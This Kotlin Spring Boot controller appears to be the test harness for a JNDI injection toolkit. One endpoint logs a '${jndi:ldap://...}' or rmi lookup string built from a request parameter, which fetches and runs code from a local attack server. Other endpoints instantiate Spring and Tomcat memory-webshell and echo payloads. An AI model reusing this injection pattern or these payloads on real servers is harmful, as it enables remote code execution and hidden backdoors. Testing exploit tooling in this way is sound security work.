package springboot

import http.payloads.echo.SpringEcho
import http.payloads.echo.TomcatEcho
import http.payloads.memshell.SpringShell
import http.payloads.memshell.TomcatShell
import org.apache.logging.log4j.LogManager
import org.springframework.web.bind.annotation.RequestMapping
import org.springframework.web.bind.annotation.RequestParam
import org.springframework.web.bind.annotation.ResponseBody
import org.springframework.web.bind.annotation.RestController

@RestController
@RequestMapping("/")
class TestController {
    private val logger = LogManager.getLogger(TestController::class.java)

    @ResponseBody
    @RequestMapping("/log")
    fun log(@RequestParam type: String?, @RequestParam index: String?): String {
        if (type?.equals("ldap", true) == true) {
            logger.error(String.format("\${jndi:ldap://127.0.0.1:1389/%s}", index))
        } else {
            logger.error(String.format("\${jndi:rmi://127.0.0.1:1099/%s}", index))
        }
        return "200 OK"
    }

    @ResponseBody
    @RequestMapping("/spring-echo")
    fun springEcho(): String {
        SpringEcho()
        return "200 OK"
    }

    @ResponseBody
    @RequestMapping("/tomcat-echo")
    fun tomcatEcho(): String {
        TomcatEcho()
        return "200 OK"
    }

    @ResponseBody
    @RequestMapping("/spring-shell")
    fun springShell(): String {
        SpringShell()
        return "200 OK"
    }

    @ResponseBody
    @RequestMapping("/tomcat-shell")
    fun tomcatShell(): String {
        TomcatShell()
        return "200 OK"
    }
}
